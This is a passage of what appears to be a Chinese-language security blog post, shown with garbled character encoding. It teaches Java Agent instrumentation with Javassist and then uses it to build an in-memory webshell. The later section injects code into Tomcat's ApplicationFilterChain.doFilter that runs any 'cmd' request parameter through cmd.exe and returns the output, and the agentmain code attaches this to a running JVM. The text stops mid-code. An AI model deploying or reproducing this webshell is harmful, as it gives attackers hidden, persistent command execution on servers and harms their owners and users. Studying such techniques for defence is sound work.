è½½æ—¶ï¼‰</td></tr><tr><td align="left"><strong>Can-Redefine-Classes</strong></td><td align="left">Agent èƒ½å¦é‡æ–°å®šä¹‰ï¼ˆæ›¿æ¢ï¼‰å·²åŠ è½½çš„ç±» é€šè¿‡ <code>Instrumentation.redefineClasses()</code></td><td align="left"><code>true</code> &#x2F; <code>false</code></td><td align="left"><code>false</code></td><td align="left"><strong>é‡è¦</strong></td></tr><tr><td align="left"><strong>Can-Retransform-Classes</strong></td><td align="left">Agent èƒ½å¦è½¬æ¢ï¼ˆä¿®æ”¹ï¼‰å·²åŠ è½½çš„ç±» é€šè¿‡ <code>Instrumentation.retransformClasses()</code></td><td align="left"><code>true</code> &#x2F; <code>false</code></td><td align="left"><code>false</code></td><td align="left"><strong>é‡è¦</strong></td></tr><tr><td align="left"><strong>Can-Set-Native-Method-Prefix</strong></td><td align="left">æ˜¯å¦å…è®¸ä¿®æ”¹ Native æ–¹æ³•çš„å‰ç¼€ ç”¨äºæ‹¦æˆª Native æ–¹æ³•è°ƒç”¨</td><td align="left"><code>true</code> &#x2F; <code>false</code></td><td align="left"><code>false</code></td><td align="left"><strong>é«˜çº§åŠŸèƒ½</strong></td></tr></tbody></table><h3 id="æ„å»ºé…ç½®pom-xml"><a href="#æ„å»ºé…ç½®pom-xml" class="headerlink" title="æ„å»ºé…ç½®pom.xml"></a>æ„å»ºé…ç½®pom.xml</h3><p>é€šè¿‡é…ç½®<code>pom.xml</code>ä½¿æˆ‘ä»¬çš„é¡¹ç›®å¯¼å‡ºæ–¹å¼ä¸º<code>jar-with-dependencies</code>ï¼Œè¿˜éœ€è¦æŒ‡å®š<code>MANIFEST.MF</code>çš„è·¯å¾„è€Œä¸éœ€è¦è‡ªåŠ¨ç”Ÿæˆï¼Œä¸»è¦æ˜¯ä¿®æ”¹<code>&lt;build&gt;</code>æ ‡ç­¾ä¸‹çš„å†…å®¹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">manifestFile</span>&gt;</span>src/main/resources/META-INF/MANIFEST.MF<span class="tag">&lt;/<span class="name">manifestFile</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¾èµ–ä¸»è¦æ˜¯ä¿®æ”¹å­—èŠ‚ç çš„åŒ…ï¼Œæ¯”å¦‚<code>javassist</code>ã€<code>asm</code></p><h3 id="é€šè¿‡premain-æ–¹æ³•ä¿®æ”¹å­—èŠ‚ç "><a href="#é€šè¿‡premain-æ–¹æ³•ä¿®æ”¹å­—èŠ‚ç " class="headerlink" title="é€šè¿‡premain()æ–¹æ³•ä¿®æ”¹å­—èŠ‚ç "></a>é€šè¿‡<code>premain()</code>æ–¹æ³•ä¿®æ”¹å­—èŠ‚ç </h3><p>æ„å»ºä¸€ä¸ªæ­£å¸¸çš„<code>app.jar</code>ç¨‹åºï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯æ¯éš”ä¸€ç§’è¾“å‡ºä¸€å¥<code>&quot;hello world&quot;</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘ä»¬å®šä¹‰çš„<code>Agent</code>ç±»ä¸­ï¼Œå®šä¹‰<code>premain()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬è¦ç”¨åˆ°<code>Instrumentation</code>çš„ä¸€äº›æ–¹æ³•è°ƒç”¨å·²åŠ è½½çš„ç±»å¹¶è¿›è¡Œä¿®æ”¹ï¼Œå¸¸ç”¨çš„æ–¹æ³•</p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td align="left"><strong><code>getAllLoadedClasses()</code></strong></td><td align="left">è·å– JVM ä¸­æ‰€æœ‰å·²åŠ è½½çš„ç±»æ•°ç»„ï¼Œå¯ç­›é€‰å…³å¿ƒçš„ç±»</td></tr><tr><td align="left"><strong><code>redefineClasses(ClassDefinition... definitions)</code></strong></td><td align="left">ä½¿ç”¨ç±»å®šä¹‰é‡æ–°å®šä¹‰æŒ‡å®šçš„ç±»</td></tr><tr><td align="left"><strong><code>retransformClasses(Class&lt;?&gt;... classes)</code></strong></td><td align="left">ä½¿ç”¨å·²æ³¨å†Œçš„ transformers ä¿®æ”¹æŒ‡å®šçš„ç±»</td></tr><tr><td align="left"><strong><code>addTransformer(ClassFileTransformer transformer)</code></strong></td><td align="left">æ³¨å†Œç±»æ–‡ä»¶è½¬æ¢å™¨</td></tr><tr><td align="left"><strong><code>removeTransformer(ClassFileTransformer transformer)</code></strong></td><td align="left">æ³¨é”€ç±»æ–‡ä»¶è½¬æ¢å™¨</td></tr></tbody></table><p>æ¯”å¦‚è¿™é‡Œï¼Œæˆ‘ä»¬å°è¯•è®©å…ˆå‰app.jarä¸å†æ‰“å°<code>&quot;hello world&quot;</code>è€Œæ˜¯<code>&quot;hello Sekai&quot;</code>ï¼Œå…ˆè·å–<code>Main</code>ç±»å†å°è¯•ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">CustomTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; clazz : classes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getName().startsWith(<span class="string">&quot;Main&quot;</span>)) &#123;</span><br><span class="line">                inst.retransformClasses(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦æ³¨å†Œä¸€ä¸ªè½¬æ¢å™¨å»æ‰§è¡Œå¯¹ç±»å­—èŠ‚ç çš„ä¿®æ”¹æ“ä½œï¼Œè¯¥ç±»éœ€è¦å®ç°<code>ClassFileTransformer</code>æ¥å£ï¼Œé‡å†™<code>transform()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨<code>transform()</code>æ–¹æ³•ä¸­ä½¿ç”¨Javassistæ“ä½œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CustomTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">            <span class="keyword">if</span> (className == <span class="literal">null</span> || !className.equals(<span class="string">&quot;Main&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">byte</span>[] transformedBytes;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer));</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;main&quot;</span>);</span><br><span class="line">                method.setBody(<span class="string">&quot;&#123; System.out.println(\&quot;Hello Sekai\&quot;); &#125;&quot;</span>);</span><br><span class="line">                transformedBytes = ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> transformedBytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å°†è¯¥é¡¹ç›®æ‰“åŒ…ä¸ºjarï¼Œä½¿ç”¨ä¸åŒçš„æ–¹å¼å¯åŠ¨ç¨‹åºåˆ™ä¼šæ‰“å°ä¸åŒçš„å†…å®¹</p><p><img src="/img/post/image-20260115200722448.png" alt="image-20260115200722448"></p><h3 id="é€šè¿‡agentmain-æ–¹æ³•ä¿®æ”¹å­—èŠ‚ç "><a href="#é€šè¿‡agentmain-æ–¹æ³•ä¿®æ”¹å­—èŠ‚ç " class="headerlink" title="é€šè¿‡agentmain()æ–¹æ³•ä¿®æ”¹å­—èŠ‚ç "></a>é€šè¿‡<code>agentmain()</code>æ–¹æ³•ä¿®æ”¹å­—èŠ‚ç </h3><p><del>ä¸ºäº†ä¾¿äºè¡¨ç°æ•ˆæœï¼Œæˆ‘ä»¬ä¿®æ”¹app.jarçš„é€»è¾‘è®©å®ƒå¾ªç¯æ‰“å°â€hello worldâ€</del></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¥½çš„ï¼Œç­‰æˆ‘å†™åˆ°è¿™å¥è¯çš„æ—¶å€™ï¼Œç°å®ä¸–ç•Œå·²ç»è¿‡å»å¿«8ä¸ªå°æ—¶äº†ï¼Œç”±äºæˆ‘ä¸€ç›´å°è¯•ç›´æ¥ç¯¡æ”¹<code>main()</code>æ–¹æ³•çš„å¾ªç¯ï¼Œä½†æ˜¯å®é™…ä¸Šå³ä½¿ç±»è¢«é‡æ–°å®šä¹‰ä¹Ÿæ˜¯ä¸ä¼šç«‹å³ç”Ÿæ•ˆçš„ï¼Œè€Œæ˜¯ç­‰åˆ°å…¶å®‰å…¨é€€å‡ºï¼Œæˆ‘çŠ¯äº†ä¸€ä¸ªæå…¶æ„šè ¢çš„é”™è¯¯ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘å°†ä½¿ç”¨å¾ªç¯å¥—ç”¨å¦ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•æ¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼Œå¹¶ä¸”è¿™æ ·ä¹Ÿæ›´ç¬¦åˆå®é™…æƒ…å†µ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            SayHello.doHello();</span><br><span class="line">            Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SayHello</code>ç±»çš„å®šä¹‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SayHello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯å®šä¹‰<code>agentmain()</code>æ–¹æ³•äº†ï¼Œå…¶å®å¤§ä½“ä¸Šå¯ä»¥å’Œ<code>premain()</code>å·®ä¸å¤š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">        <span class="type">CustomTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomTransformer</span>();</span><br><span class="line">        inst.addTransformer(transformer, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; clazz : classes) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;SayHello&quot;</span>)) &#123;</span><br><span class="line">                inst.retransformClasses(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯<code>CustomTransformer</code>ç±»çš„æ„é€ ï¼Œæ­¤å¤„åº”è¯¥è¦æŠŠ<code>loader</code>æ”¾è¿›<code>pool</code>ä¸­ï¼Œä¸ç„¶javaä¼šè¿ä¸€äº›å¾ˆåŸºç¡€çš„ç±»éƒ½æ‰¾ä¸åˆ°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CustomTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                            Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                            <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!className.equals(<span class="string">&quot;SayHello&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer));</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">target</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doHello&quot;</span>);</span><br><span class="line">            target.setBody(<span class="string">&quot;&#123; System.out.println(\&quot;Hello Sekai!\&quot;); &#125;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæºä»£ç é‡Œé¢æˆ‘æŠŠ<code>SayHello</code>ç±»æ”¾åœ¨äº†æ ¹ç›®å½•ï¼Œå¦‚æœæ˜¯æœ‰åŒ…åçš„è¯ï¼Œç”±äº<code>className</code>é»˜è®¤ä»¥<code>/</code>ä½œä¸ºåˆ†éš”ç¬¦ï¼Œåé¢å¯¹ç±»åè¿›è¡Œç­›é€‰çš„æ—¶å€™å¯ä»¥ç›´æ¥ç”¨<code>/</code>åˆ†éš”ï¼Œæˆ–è€…ä¸ºäº†é€šç”¨ä¸€äº›å¯¹<code>className</code>å¤„ç†ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">dotted</span> <span class="operator">=</span> className.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å°†é¡¹ç›®å¯¼å‡ºä¸ºjaråŒ…ï¼Œåœ¨ä¸»ç¨‹åºè¿è¡Œæ—¶å¯ä»¥é€šè¿‡ä¸€ä¸ªç¨‹åºè¿è¡Œï¼Œ<code>valueOf()</code>æ–¹æ³•å†…çš„å‚æ•°ä¸ºä¸»ç¨‹åºè¿è¡Œçš„PID</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Attach</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException &#123;</span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(String.valueOf(<span class="number">26424</span>));</span><br><span class="line">        vm.loadAgent(<span class="string">&quot;C:\\Users\\leyi\\IntelliJTest\\JavaAgentTest\\target\\JavaAgentTest-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥é€šè¿‡jcmdå‘½ä»¤è¡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jcmd 808 JVMTI.agent_load C:\Users\leyi\IntelliJTest\JavaAgentTest\target\JavaAgentTest-1.0-SNAPSHOT-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼Œè¿™é‡Œåªå±•ç¤ºä¸»ç¨‹åºçš„å˜åŒ–ï¼ŒWARNINGå‡ºç°çš„æ—¶å€™å°±æ˜¯agentæŒ‚è½½æ—¶æœº</p><p><img src="/img/post/image-20260116013202851.png" alt="image-20260116013202851"></p><br/><h2 id="Java-Agentçš„å†…å­˜é©¬å®ç°"><a href="#Java-Agentçš„å†…å­˜é©¬å®ç°" class="headerlink" title="Java Agentçš„å†…å­˜é©¬å®ç°"></a>Java Agentçš„å†…å­˜é©¬å®ç°</h2><p>é€šè¿‡agentä¿®æ”¹è¿è¡Œæ—¶çš„ç±»ï¼Œä¸ºç›®æ ‡ç±»å¯¹è±¡æ·»åŠ æˆ‘ä»¬å®šä¹‰çš„æ¶æ„é€»è¾‘</p><p><code>ApplicationFilterChain</code>ç±»æ˜¯Tomcatæ‰§è¡ŒFilteré“¾çš„æ ¸å¿ƒç±»ï¼Œè¯¥ç±»çš„<code>doFilter()</code>æ–¹æ³•èƒ½å¤Ÿæ‹¿åˆ°æ¯æ¬¡è¯·æ±‚çš„<code>ServletRequest</code>å’Œ<code>ServletResponse</code>å¯¹è±¡ï¼Œè¿™å¯¹å®ç°å†…å­˜é©¬å›æ˜¾æ˜¯æå¥½çš„</p><p>å‡†å¤‡çš„æ¶æ„é€»è¾‘ï¼Œæ’å…¥<code>doFilter()</code>æ–¹æ³•å‰ï¼Œç”±äºjavassistä¸æ”¯æŒå¯å˜å‚æ•°ï¼Œè¿™é‡Œçœ‹äº†<code>ProcessBuilder</code>ç±»çš„æ„é€ æ–¹æ³•éœ€è¦ä¼ å…¥ä¸€ä¸ªåˆ—è¡¨ï¼Œè¿™é‡Œéœ€è¦å…ˆæ„é€ åˆ—è¡¨ï¼Œå¹¶ä¸”javassistä¸æ”¯æŒæ³›å‹ï¼Œä¹Ÿä¸ç”¨å†™æ³›å‹äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        ProcessBuilder processBuilder;</span><br><span class="line">        <span class="type">List</span> <span class="variable">command</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        command.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">        command.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">        command.add(cmd);                </span><br><span class="line">        processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(command);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=GBK&quot;</span>);</span><br><span class="line">        response.getWriter().println(output);</span><br><span class="line">    &#125;         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–å†™<code>agentmain()</code>æ–¹æ³•ç”¨äºå®ç°è¿è¡Œæ—¶åŠ è½½agentï¼Œ<code>FilterChain</code>ç±»éœ€è¦ä½¿ç”¨å…¨é™å®šå</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">        <span class="type">CustomTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomTransformer</span>();</span><br><span class="line">        inst.addTransformer(transformer, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; clazz : classes) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>)) &#123;</span><br><span class="line">                inst.retransformClasses(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰CustomTransformerç±»ï¼Œéœ€è¦å¯¼å…¥å¿…è¦çš„åŒ…ï¼Œæ¯”å¦‚<code>List</code>ã€<code>BufferedReader</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CustomTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                                Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                                <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!className.equals(<span class="string">&quot;org/apache/catalina/core/ApplicationFilterChain&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                pool.importPackage(<span class="string">&quot;java.util&quot;</span>);</span><br><span class="line">                pool.importPackage(<span class="string">&quot;java.io&quot;</span>);</span><br><span class="line">                pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer));</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">target</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                target.insertBefore(<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            if (cmd != null) &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                StringBuilder output = new StringBuilder();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                ProcessBuilder processBuilder;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                List command =  new ArrayList();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                command.add(\&quot;cmd.exe\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                command.add(\&quot;/c\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                command.add(cmd);&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                processBuilder = new ProcessBuilder(command);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    Process process = processBuilder.start();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    while ((line = reader.readLine()) != null) &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                        